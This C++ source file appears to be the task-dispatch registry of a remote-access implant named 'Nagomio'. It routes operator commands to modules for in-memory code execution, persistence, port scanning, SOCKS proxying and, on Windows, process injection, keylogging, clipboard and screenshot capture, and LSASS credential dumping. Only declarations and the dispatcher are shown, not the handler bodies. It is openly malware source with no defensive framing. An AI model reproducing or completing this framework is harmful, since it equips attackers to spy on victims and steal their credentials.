#include "registry.h"

#include <array>
#include <cstring>
#include <random>
#include <string>

namespace nagomio_modules {

std::string dispatch(const Nagomio::Task& task, const std::string& agent_id);
std::string handle_mem_exec(const std::vector<std::string>& args);
std::string handle_persist(const std::vector<std::string>& args, const std::string& agent_id);
std::string handle_whoami(const std::vector<std::string>& args);
std::string handle_uninstall(const std::vector<std::string>& args);
std::string handle_portscan(const std::vector<std::string>& args);
std::string handle_socks(const std::vector<std::string>& args, const std::string& agent_id);

#ifdef _WIN32
std::string handle_inject(const std::vector<std::string>& args);
std::string handle_screenshot(const std::vector<std::string>& args);
std::string handle_clipboard(const std::vector<std::string>& args);
std::string handle_keylog(const std::vector<std::string>& args);
std::string handle_lsass(const std::vector<std::string>& args);
#endif

bool is_known_module(const std::string& cmd) {
    if (cmd == "whoami") return true;
    if (cmd == "mem_exec") return true;
    if (cmd == "portscan") return true;
    if (cmd == "persist") return true;
    if (cmd == "uninstall") return true;
    if (cmd == "socks") return true;
#ifdef _WIN32
    if (cmd == "inject") return true;
    if (cmd == "screenshot") return true;
    if (cmd == "clipboard") return true;
    if (cmd == "keylog") return true;
    if (cmd == "lsass") return true;
#endif
    return false;
}

std::string dispatch(const Nagomio::Task& task, const std::string& agent_id) {
    const std::string& cmd = task.command;
    if (cmd == "mem_exec") return handle_mem_exec(task.arguments);
    if (cmd == "persist") return handle_persist(task.arguments, agent_id);
    if (cmd == "whoami") return handle_whoami(task.arguments);
    if (cmd == "uninstall") return handle_uninstall(task.arguments);
    if (cmd == "portscan") return handle_portscan(task.arguments);
    if (cmd == "socks") return handle_socks(task.arguments, agent_id);
#ifdef _WIN32
    if (cmd == "inject") return handle_inject(task.arguments);
    if (cmd == "screenshot") return handle_screenshot(task.arguments);
    if (cmd == "clipboard") return handle_clipboard(task.arguments);
    if (cmd == "keylog") return handle_keylog(task.arguments);
    if (cmd == "lsass") return handle_lsass(task.arguments);
#endif
    nlohmann::json err = {{"error", "unknown module"}, {"command", cmd}};
    return err.dump();
}

} // namespace nagomio_modules